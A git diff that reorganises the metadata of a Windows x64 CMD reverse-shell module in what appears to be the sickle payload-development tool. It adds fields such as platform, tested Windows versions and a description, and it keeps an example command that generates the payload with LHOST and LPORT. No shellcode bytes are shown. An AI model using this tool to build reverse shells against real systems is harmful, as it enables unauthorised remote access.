@@ -12,9 +12,28 @@ from sickle.common.lib.generic.convert import port_str_to_htons
 
 class Shellcode():
 
-    author      = ["Morten Schenk", "Alexandru Uifalvi", "Matteo Memelli", "wetw0rk"]
-    description = "Windows (x64) CMD Reverse Shell"
-    example_run = f"{sys.argv[0]} -p windows/x64/shell_reverse_tcp LHOST=192.168.81.144 LPORT=1337 -f c"
+    name = "Windows (x64) CMD Reverse Shell"
+
+    module = "windows/x64/shell_reverse_tcp"
+
+    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
+
+    platform = "Windows"
+
+    arch = "x64"
+
+    ring = 3
+
+    author = ["Morten Schenk", "Alexandru Uifalvi", "Matteo Memelli", "wetw0rk"]
+
+    tested_platforms = ["Windows 11", "Windows 10"]
+
+    summary = "TCP based reverse shell over IPV4 which returns an interactive cmd.exe session"
+
+    description = """
+    Simple reverse shellcode that will spawn a connection back to a listening tcp
+    server. Connection is made via TCP over IPV4.
+    """
 
     arguments = {}
     arguments["LHOST"] = {}
@@ -30,7 +49,7 @@ class Shellcode():
     def __init__(self, arg_object):
 
         self.arg_list = arg_object["positional arguments"]
-        self.builder = Assembler('x64')
+        self.builder = Assembler(Shellcode.arch)
 
         return
 
